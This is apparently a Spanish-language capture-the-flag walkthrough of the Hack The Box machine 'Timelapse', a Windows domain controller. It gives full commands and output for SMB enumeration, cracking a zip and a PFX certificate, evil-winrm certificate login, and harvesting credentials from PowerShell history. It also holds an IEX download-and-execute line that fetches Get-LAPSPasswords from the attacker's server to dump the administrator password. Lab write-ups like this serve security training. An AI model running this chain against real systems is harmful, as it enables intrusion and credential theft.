# Enumeración | Reconocimiento | y posibles ataques

ping 10.10.11.152

→<br>
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.<br>
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=225 ms<br>

TTL = 127 → Windows

nmap -p- -sS --min-rate 5000 -vv -n 10.10.11.152<br>
<br>
→<br>
PORT  	STATE SERVICE      	REASON<br>
53/tcp	open  domain       	syn-ack ttl 127 <br>
88/tcp	open  kerberos-sec 	syn-ack ttl 127<br>
135/tcp   open  msrpc        	syn-ack ttl 127<br>
139/tcp   open  netbios-ssn  	syn-ack ttl 127<br>
389/tcp   open  ldap         	syn-ack ttl 127<br>
445/tcp   open  microsoft-ds 	syn-ack ttl 127<br>
464/tcp   open  kpasswd5     	syn-ack ttl 127<br>
593/tcp   open  http-rpc-epmap   syn-ack ttl 127<br>
636/tcp   open  ldapssl      	syn-ack ttl 127<br>
3268/tcp  open  globalcatLDAP	syn-ack ttl 127<br>
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127<br>
5986/tcp  open  wsmans       	syn-ack ttl 127<br>
9389/tcp  open  adws         	syn-ack ttl 127<br>
49667/tcp open  unknown      	syn-ack ttl 127<br>
49673/tcp open  unknown      	syn-ack ttl 127<br>
49674/tcp open  unknown      	syn-ack ttl 127<br>
49696/tcp open  unknown      	syn-ack ttl 127<br>
57257/tcp open  unknown      	syn-ack ttl 127<br>


nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,57257  10.10.11.152 -sCV -oN services<br>

→<br>

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 22:06 PDT<br>
Nmap scan report for 10.10.11.152<br>
Host is up (0.23s latency).<br>
<br>
PORT  	STATE SERVICE       	VERSION<br>
53/tcp	open  domain        	Simple DNS Plus<br>
88/tcp	open  kerberos-sec  	Microsoft Windows Kerberos (server time: 2023-04-05 06:06:33Z)<br>
135/tcp   open  msrpc         	Microsoft Windows RPC<br>
139/tcp   open  netbios-ssn   	Microsoft Windows netbios-ssn<br>
389/tcp   open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>
445/tcp   open  microsoft-ds?<br>
464/tcp   open  kpasswd5?<br>
593/tcp   open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0<br>
636/tcp   open  ldapssl?<br>
3268/tcp  open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>
3269/tcp  open  globalcatLDAPssl?<br>
5986/tcp  open  ssl/http      	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>
|_http-server-header: Microsoft-HTTPAPI/2.0<br>
| tls-alpn:<br>
|_  http/1.1<br>
| ssl-cert: Subject: commonName=dc01.timelapse.htb<br>
| Not valid before: 2021-10-25T14:05:29<br>
|_Not valid after:  2022-10-25T14:25:29<br>
|_http-title: Not Found<br>
|_ssl-date: 2023-04-05T06:08:07+00:00; +1h00m02s from scanner time.<br>
9389/tcp  open  mc-nmf        	.NET Message Framing<br>
49667/tcp open  msrpc         	Microsoft Windows RPC<br>
49673/tcp open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0<br>
49674/tcp open  msrpc         	Microsoft Windows RPC<br>
49696/tcp open  msrpc         	Microsoft Windows RPC<br>
57257/tcp open  msrpc         	Microsoft Windows RPC<br>
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br>
<br>
Host script results:<br>
|_clock-skew: mean: 1h00m01s, deviation: 0s, median: 1h00m01s<br>
| smb2-time:<br>
|   date: 2023-04-05T06:07:31<br>
|_  start_date: N/A<br>
| smb2-security-mode:<br>
|   311:<br><br>
|_	Message signing enabled and required<br>
<br>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
Nmap done: 1 IP address (1 host up) scanned in 113.34 seconds<br>






crackmapexec smb 10.10.11.152

→ <br>
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)<br>


smbclient -L 10.10.11.152 -N<br>
<br>
→<br>
	Sharename   	Type  	Comment<br>
    ---------   	----  	-------<br>
    ADMIN$      	Disk  	Remote Admin<br>
    C$          	Disk  	Default share<br>
    IPC$        	IPC   	Remote IPC<br>
    NETLOGON    	Disk  	Logon server share<br>
    Shares      	Disk 	 <br>
    SYSVOL      	Disk  	Logon server share<br>


crackmapexec smb 10.10.11.152 --shares

→
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)<br>
SMB     	10.10.11.152	445	DC01         	[-] Error enumerating shares: STATUS_USER_SESSION_DELETED<br>

smbmap -H 10.10.11.152 -u 'null'

→<br>
[+] Guest session  	 IP: 10.10.11.152:445    Name: timelapse.htb<br>                                	 
    	Disk                                             		 Permissions    Comment<br>
    ----                                             		 -----------    -------<br>
    ADMIN$                                       		 NO ACCESS    Remote Admin<br>
    C$                                           		 NO ACCESS    Default share<br>
    IPC$                                         		 READ ONLY    Remote IPC<br>
    NETLOGON                                     		 NO ACCESS    Logon server share<br>
    Shares                                       		 READ ONLY    <br>
    SYSVOL                                       		 NO ACCESS    Logon server share<br>





# Explotación y movimiento lateral

smbclient //10.10.11.152/Shares -N

→<br>
Try "help" to get a list of possible commands.
smb: \><br>



smb: \> dir<br>

→<br>
  .                               	D    	0  Mon Oct 25 08:39:15 2021<br>
  ..                              	D    	0  Mon Oct 25 08:39:15 2021<br>
  Dev                             	D    	0  Mon Oct 25 12:40:06 2021<br>
  HelpDesk                        	D    	0  Mon Oct 25 08:48:42 2021<br>

cd Dev<br>

→<br>


cd HelpDesk<br>

→<br>
smb: \HelpDesk\><br>

dir<br>

→<br>
  .                               	D    	0  Mon Oct 25 08:48:42 2021<br>
  ..                              	D    	0  Mon Oct 25 08:48:42 2021<br>
  LAPS.x64.msi                    	A  1118208  Mon Oct 25 07:57:50 2021<br>
  LAPS_Datasheet.docx             	A   104422  Mon Oct 25 07:57:46 2021<br>
  LAPS_OperationsGuide.docx       	A   641378  Mon Oct 25 07:57:40 2021<br>
  LAPS_TechnicalSpecification.docx  	A	72683  Mon Oct 25 07:57:44 2021<br>


smb: \Dev\> get winrm_backup.zip<br>

→<br>
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)<br>


Listo el contenido del zip<br>
7z l winrm_backup.zip<br>

→<br>
   Date  	Time	Attr     	Size   Compressed  Name<br>
------------------- ----- ------------ ------------  ------------------------<br>
2021-10-25 07:21:20 .....     	2555     	2405  legacyy_dev_auth.pfx<br>
------------------- ----- ------------ ------------  ------------------------<br>
2021-10-25 07:21:20           	2555     	2405  1 files<br>




fcrackzip -v -u -D -p /home/kali/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt winrm_backup.zip<br>

→<br>
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)<br>
checking pw udehss<br>                             	 

PASSWORD FOUND!!!!: pw == supremelegacy<br>


Descomprimo<br>
unzip winrm_backup.zip<br>


https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>

Todavía no puedo obtener clave privada porque me pide contraseña<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes<br>


apt install libssl-dev<br>

git clone https://github.com/crackpkcs12/crackpkcs12<br>
cd crackpkcs12<br>
./configure<br>
make<br>
make install<br>


crackpkcs12 -d rockyou.txt legacyy_dev_auth.pfx<br>

→<br>


Password:thuglegacy<br>


Crear la priv-key.pem / llave privada<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes<br>
Password:thuglegacy<br>


Crear el certificado publico<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem<br>
Password:thuglegacy<br>


Como esta abierto el puerto 5986 puedo autenticarme con la llave privada y certificado usando evil-winrm<br>

evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S<br>

FLAG de usuario<br>

net user<br>

whoami /priv<br>

net user legacyy<br>


net user “variosusuarios”<br>

net user svc_deploy<br>

→svc_deploy pertenece al grupo *LAPS_Readers osea que seguro puede leer contraseñas<br>







# Explotación WEB






# Escalada de privilegios

https://www.hackingarticles.in/credential-dumpinglaps/

→Uso de Get-LAPSPasswords

→https://github.com/kfosaaen/Get-LAPSPasswords


Ver historial de Powershell

AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history. txt

*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br>
whoami<br>
ipconfig /all<br>
netstat -ano |select-string LIST<br>
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br>
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force<br>
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)<br>
invoke-command -computername localhost -credential $c -port 5986 -usessl -<br>
SessionOption $so -scriptblock {whoami}<br>
get-aduser -filter * -properties *<br>
exit<br>



Encuentro credenciales<br>


svc_deploy<br>
E3R$Q62^12p7PLlC%KWaxuaV<br>


Acceso con evilwinrm con SSL <br>

evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S<br>


Equipo atacante<br>
git clone https://github.com/kfosaaen/Get-LAPSPasswords<br>

python3 -m http.server 80<br>

Equipo victima<br>
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.12/Get-LAPSPasswords.ps1')<br>


Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords<br>


Valido que es la contraseña del usuario administrador<br>

crackmapexec smb 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0'<br>

htb) (signing:True) (SMBv1:False)<br>
SMB     	10.10.11.152	445	DC01         	[+] timelapse.htb\Administrator:.1zOg84gyR2B-I9%I8QQI6!0 (Pwn3d!)<br>


Accedo como administrador<br>

evil-winrm -i 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0' -S<br>


*Evil-WinRM* PS C:\Users\TRX\desktop> type root.txt<br>
2da82aa548b0b149ec38a187130cf82c<br>





# Links útiles
https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>
https://www.hackingarticles.in/credential-dumpinglaps/<br>
https://github.com/kfosaaen/Get-LAPSPasswords<br>


  
  
  
## Lenguajes utilizados
## Vulnerabilidades en aplicaciones
* LAPS
## Ataques
## Escalada de privilegios
## Exploits
## Herramientas
* Extensión .PFX
